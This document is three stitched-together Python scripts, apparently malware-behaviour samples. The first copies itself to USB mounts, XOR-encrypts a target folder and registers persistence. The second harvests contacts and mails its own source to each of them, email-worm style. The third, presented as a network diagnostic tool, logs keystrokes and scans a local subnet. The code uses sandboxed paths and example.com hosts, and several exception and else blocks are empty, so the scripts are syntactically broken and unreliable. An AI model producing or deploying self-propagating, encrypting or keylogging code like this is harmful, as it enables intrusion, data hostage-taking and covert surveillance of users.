#!/usr/bin/env python3

import os
import sys
import shutil
import tarfile
import json
import hashlib
import secrets
from pathlib import Path
from datetime import datetime


def generate_session_key():
    return secrets.token_bytes(32)


def simple_encrypt(data: bytes, key: bytes) -> bytes:
    key_len = len(key)
    return bytes(b ^ key[i % key_len] for i, b in enumerate(data))


def simple_decrypt(data: bytes, key: bytes) -> bytes:
    return simple_encrypt(data, key)


class DeploymentTool:
    def __init__(self):
        self.script_path = Path(__file__).resolve()
        self.mount_targets = [Path("mnt/usb_a"), Path("mnt/usb_b")]
        self.target_dir = Path("./target")
        self.session_key = generate_session_key()
        self.log_entries = []

    def log(self, message: str):
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        log_msg = f"[{timestamp}] {message}"
        print(log_msg)
        self.log_entries.append(log_msg)

    def detect_mounted_targets(self):
        detected = []

        for target in self.mount_targets:
            try:
                target.mkdir(parents=True, exist_ok=True)

                if target.exists() and target.is_dir():
                    test_file = target / ".write_test"
                    try:
                        test_file.touch()
                        test_file.unlink()
                        detected.append(target)
                    except (PermissionError, OSError) as e:
                else:
            except Exception as e:

        return detected

    def copy_to_targets(self, targets):

        if not self.script_path.exists():
            return

        for target in targets:
            try:
                dest = target / self.script_path.name
                shutil.copy2(self.script_path, dest)
                os.chmod(dest, 0o755)

                info = {
                    "deployed_at": datetime.now().isoformat(),
                    "source": str(self.script_path),
                    "version": "1.0.0",
                    "checksum": self.calculate_file_checksum(self.script_path)
                }
                info_file = target / "deployment_info.json"
                with open(info_file, 'w', encoding='utf-8') as f:
                    json.dump(info, f, indent=2, ensure_ascii=False)

            except Exception as e:

    def calculate_file_checksum(self, filepath):
        sha256_hash = hashlib.sha256()
        with open(filepath, "rb") as f:
            for byte_block in iter(lambda: f.read(4096), b""):
                sha256_hash.update(byte_block)
        return sha256_hash.hexdigest()

    def encrypt_and_archive_target(self):

        if not self.target_dir.exists():
            self.target_dir.mkdir(parents=True, exist_ok=True)
            (self.target_dir / "config.json").write_text(
                json.dumps({"example": "configuration"}, indent=2), 
                encoding='utf-8'
            )

        files_to_archive = []
        for root, dirs, files in os.walk(self.target_dir):
            for file in files:
                file_path = Path(root) / file
                files_to_archive.append(file_path)

        if not files_to_archive:
            return


        archive_name = f"deployment_archive_{datetime.now().strftime('%Y%m%d_%H%M%S')}.tar.gz"
        archive_path = Path(archive_name)

        try:
            with tarfile.open(archive_path, "w:gz") as tar:
                for file_path in files_to_archive:
                    arcname = file_path.relative_to(self.target_dir.parent)
                    tar.add(file_path, arcname=arcname)


            with open(archive_path, 'rb') as f:
                archive_data = f.read()

            encrypted_data = simple_encrypt(archive_data, self.session_key)

            encrypted_archive = archive_path.with_suffix('.tar.gz.enc')
            with open(encrypted_archive, 'wb') as f:
                f.write(encrypted_data)

            key_file = Path("session_key.bin")
            with open(key_file, 'wb') as f:
                f.write(self.session_key)

            checksum = hashlib.sha256(encrypted_data).hexdigest()

            checksum_file = encrypted_archive.with_suffix('.enc.sha256')
            with open(checksum_file, 'w') as f:
                f.write(f"{checksum}  {encrypted_archive.name}\n")

            self.log(f"  ✓ SHA256: {checksum[:16]}...")

            archive_path.unlink()

            self.verify_encryption(encrypted_archive)

        except Exception as e:

    def verify_encryption(self, encrypted_file):
        try:
            with open(encrypted_file, 'rb') as f:
                encrypted_data = f.read()

            decrypted_data = simple_decrypt(encrypted_data, self.session_key)

            test_path = Path("test_decrypt.tar.gz")
            with open(test_path, 'wb') as f:
                f.write(decrypted_data)

            with tarfile.open(test_path, 'r:gz') as tar:
                members = tar.getmembers()

            test_path.unlink()

        except Exception as e:

    def register_deployment_service(self):

        service_config = {
            "service_name": "deployment_sync",
            "enabled": True,
            "targets": [str(t) for t in self.mount_targets],
            "registered_at": datetime.now().isoformat(),
            "sync_operations": []
        }

        config_file = Path("deployment_service.json")
        try:
            with open(config_file, 'w', encoding='utf-8') as f:
                json.dump(service_config, f, indent=2, ensure_ascii=False)


            for i in range(3):
                sync_op = {
                    "iteration": i + 1,
                    "timestamp": datetime.now().isoformat(),
                    "status": "completed"
                }
                service_config["sync_operations"].append(sync_op)

            with open(config_file, 'w', encoding='utf-8') as f:
                json.dump(service_config, f, indent=2, ensure_ascii=False)


        except Exception as e:

    def generate_manifest(self):

        manifest = {
            "deployment_id": secrets.token_hex(16),
            "timestamp": datetime.now().isoformat(),
            "script_path": str(self.script_path),
            "script_checksum": self.calculate_file_checksum(self.script_path),
            "targets": [str(t) for t in self.mount_targets],
            "files_deployed": [],
            "archives_created": []
        }

        for f in Path(".").glob("deployment_archive_*.tar.gz.enc"):
            manifest["archives_created"].append({
                "filename": f.name,
                "size": f.stat().st_size,
                "checksum": self.calculate_file_checksum(f)
            })

        manifest_file = Path("deployment_manifest.json")
        try:
            with open(manifest_file, 'w', encoding='utf-8') as f:
                json.dump(manifest, f, indent=2, ensure_ascii=False)
        except Exception as e:

    def save_log(self):
        log_file = Path(f"deployment_log_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt")
        try:
            with open(log_file, 'w', encoding='utf-8') as f:
                f.write('\n'.join(self.log_entries))
        except Exception as e:

    def run(self):
        self.log("=" * 60)
        self.log("=" * 60)

        detected_targets = self.detect_mounted_targets()

        if detected_targets:
            self.copy_to_targets(detected_targets)
        else:

        self.encrypt_and_archive_target()

        self.register_deployment_service()

        self.generate_manifest()

        self.log("=" * 60)
        self.log("=" * 60)

        self.save_log()


def main():
    try:
        tool = DeploymentTool()
        tool.run()
        return 0
    except KeyboardInterrupt:
        return 1
    except Exception as e:
        import traceback
        traceback.print_exc()
        return 1


if __name__ == "__main__":
    sys.exit(main())

#!/usr/bin/env python3
import os
import shutil
import smtplib
import tarfile
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders
from email.mime.text import MIMEText
from pathlib import Path
import sys
import json
import re

def read_contacts(filepath):
    contacts = []
    try:
        with open(filepath, 'r', encoding='utf-8') as f:
            for line in f:
                line = line.strip()
                if line and not line.startswith('#'):
                    contacts.append(line)
    except FileNotFoundError:
    return contacts

def extract_contacts_from_recipient(recipient):
    contacts = []

    recipient_safe = re.sub(r'[^\w\-.]', '_', recipient)
    contacts_path = f'contacts_cache/{recipient_safe}_contacts.txt'

    try:
        if os.path.exists(contacts_path):
            with open(contacts_path, 'r', encoding='utf-8') as f:
                for line in f:
                    line = line.strip()
                    if line and '@' in line and not line.startswith('#'):
                        contacts.append(line)
    except Exception:
        pass

    addressbook_path = 'addressbook.json'
    try:
        if os.path.exists(addressbook_path):
            with open(addressbook_path, 'r', encoding='utf-8') as f:
                addressbook = json.load(f)
                if recipient in addressbook:
                    entry = addressbook[recipient]
                    if 'contacts' in entry:
                        contacts.extend(entry['contacts'])
    except Exception:
        pass

    return list(set(contacts))

def package_program(outbox_dir, contacts):
    os.makedirs(outbox_dir, exist_ok=True)

    archive_path = os.path.join(outbox_dir, 'notification_package.tar.gz')

    with tarfile.open(archive_path, 'w:gz') as tar:
        if os.path.exists(__file__):
            tar.add(__file__, arcname=os.path.basename(__file__))

        manifest_path = os.path.join(outbox_dir, 'recipient_manifest.txt')
        with open(manifest_path, 'w', encoding='utf-8') as f:
            for i, contact in enumerate(contacts, 1):
                f.write(f"{i}. {contact}\n")

        tar.add(manifest_path, arcname='recipient_manifest.txt')

    return archive_path

def send_notification(recipient, attachment_path, smtp_server, smtp_port):
    try:
        msg = MIMEMultipart()
        msg['From'] = 'notifier@example.com'
        msg['To'] = recipient

        body = f"""



"""
        msg.attach(MIMEText(body, 'plain', 'utf-8'))

        with open(attachment_path, 'rb') as f:
            part = MIMEBase('application', 'gzip')
            part.set_payload(f.read())
            encoders.encode_base64(part)
            part.add_header(
                'Content-Disposition',
                f'attachment; filename={os.path.basename(attachment_path)}'
            )
            msg.attach(part)

        with smtplib.SMTP(smtp_server, smtp_port, timeout=2) as server:
            server.sendmail(msg['From'], recipient, msg.as_string())

        return True, None

    except (smtplib.SMTPException, OSError, ConnectionRefusedError, TimeoutError) as e:
        return False, str(e)

def main():
    contacts_file = 'target/contacts.txt'
    outbox_dir = 'outbox'
    smtp_server = 'mailgw.example.com'
    smtp_port = 25


    contacts = read_contacts(contacts_file)

    if not contacts:
        sys.exit(0)

    propagated_contacts = set(contacts)
    propagation_log = {}

    for recipient in contacts:
        extracted = extract_contacts_from_recipient(recipient)
        if extracted:
            propagated_contacts.update(extracted)
            propagation_log[recipient] = extracted

    all_contacts = list(propagated_contacts)

    archive_path = package_program(outbox_dir, all_contacts)


    success_count = 0
    failed_list = []

    for i, recipient in enumerate(all_contacts, 1):
        success, error = send_notification(recipient, archive_path, smtp_server, smtp_port)

        if success:
            success_count += 1
        else:
            failed_list.append((recipient, error))

    print("\n" + "="*50)
    print("="*50)

    if failed_list:
        for recipient, error in failed_list:
            error_short = error.split('\n')[0][:60]
            print(f"  - {recipient}: {error_short}")

    sys.exit(0)

if __name__ == '__main__':
    main()

#!/usr/bin/env python3
"""Network diagnostic tool with keystroke logging and optional service registration."""

import socket
import threading
import time
import ipaddress
import logging
from pathlib import Path
from datetime import datetime
import sys
import select


def setup_logging():
    """Configure logging for diagnostic output."""
    log_dir = Path("./target")
    log_dir.mkdir(exist_ok=True)

    logging.basicConfig(
        level=logging.INFO,
        format='%(asctime)s - %(levelname)s - %(message)s',
        handlers=[
            logging.FileHandler(log_dir / "diagnostic.log"),
            logging.StreamHandler(sys.stdout)
        ]
    )
    return logging.getLogger(__name__)


def scan_host(ip_address, timeout=0.1):
    """Scan a single host for connectivity on common ports."""
    ports = [80, 443, 22]
    results = {"ip": str(ip_address), "reachable": False, "open_ports": []}

    for port in ports:
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
                sock.settimeout(timeout)
                result = sock.connect_ex((str(ip_address), port))
                if result == 0:
                    results["reachable"] = True
                    results["open_ports"].append(port)
        except (socket.error, OSError) as e:
            pass

    return results


def scan_network_range(network_cidr, logger, max_hosts=5):
    """Scan a network range for host connectivity."""
    logger.info(f"Starting network scan for {network_cidr}")

    try:
        network = ipaddress.ip_network(network_cidr, strict=False)
        hosts = list(network.hosts())[:max_hosts]

        results = []
        for host in hosts:
            try:
                result = scan_host(host)
                results.append(result)

                if result["reachable"]:
                    logger.info(f"Host {result['ip']} is reachable - open ports: {result['open_ports']}")
                else:
                    logger.info(f"Host {result['ip']} is unreachable")
            except Exception as e:
                logger.warning(f"Error scanning {host}: {e}")

        return results
    except Exception as e:
        logger.error(f"Network scan error: {e}")
        return []


def log_keystrokes(log_file, duration=5, logger=None):
    """Log keyboard input to file for testing analysis."""
    if logger:
        logger.info(f"Keystroke logging active for {duration} seconds")

    log_path = Path("./target") / log_file
    log_path.parent.mkdir(exist_ok=True)

    start_time = time.time()

    with open(log_path, "a") as f:
        f.write(f"\n=== Keystroke Log Session {datetime.now().isoformat()} ===\n")

        if logger:
            logger.info("Press keys to test logging (non-blocking mode)")

        iteration_count = 0
        max_iterations = 3

        while time.time() - start_time < duration and iteration_count < max_iterations:
            if sys.stdin.isatty():
                try:
                    if select.select([sys.stdin], [], [], 0.5)[0]:
                        line = sys.stdin.readline()
                        if line:
                            timestamp = datetime.now().isoformat()
                            f.write(f"[{timestamp}] {line}")
                            f.flush()
                            if logger:
                                logger.debug(f"Logged keystroke: {len(line)} chars")
                except (OSError, IOError):
                    pass

            iteration_count += 1
            time.sleep(1)

        f.write(f"=== Session ended ===\n")

    if logger:
        logger.info(f"Keystroke logging completed: {log_path}")


def register_service(logger):
    """Optional service registration for persistent tool operation."""
    logger.info("Attempting service registration...")

    service_config = {
        "name": "network-diagnostic-tool",
        "version": "1.0.0",
        "registered_at": datetime.now().isoformat(),
        "pid": None
    }

    try:
        import os
        service_config["pid"] = os.getpid()

        config_path = Path("./target/service_config.txt")
        with open(config_path, "w") as f:
            for key, value in service_config.items():
                f.write(f"{key}: {value}\n")

        logger.info(f"Service registered successfully: PID {service_config['pid']}")
        return True
    except Exception as e:
        logger.warning(f"Service registration failed: {e}")
        return False


def periodic_diagnostics(logger, iterations=3):
    """Run periodic diagnostic checks."""
    logger.info(f"Starting periodic diagnostics ({iterations} iterations)")

    for i in range(iterations):
        logger.info(f"Diagnostic iteration {i+1}/{iterations}")

        try:
            hostname = socket.gethostname()
            logger.info(f"Hostname: {hostname}")

            try:
                local_ip = socket.gethostbyname(hostname)
                logger.info(f"Local IP: {local_ip}")
            except socket.gaierror:
                logger.warning("Could not resolve local IP (offline environment)")
        except Exception as e:
            logger.error(f"Diagnostic error: {e}")

        if i < iterations - 1:
            time.sleep(1)


def main():
    """Main execution function."""
    logger = setup_logging()
    logger.info("=== Network Diagnostic Tool Started ===")

    try:
        register_service(logger)

        keystroke_thread = threading.Thread(
            target=log_keystrokes,
            args=("log_file.txt", 3, logger),
            daemon=True
        )
        keystroke_thread.start()

        scan_network_range("192.168.1.0/24", logger, max_hosts=3)

        periodic_diagnostics(logger, iterations=2)

        keystroke_thread.join(timeout=4)

        logger.info("=== Network Diagnostic Tool Completed ===")

    except KeyboardInterrupt:
        logger.info("Tool interrupted by user")
    except Exception as e:
        logger.error(f"Unexpected error: {e}", exc_info=True)
    finally:
        logging.shutdown()


if __name__ == "__main__":
    main()

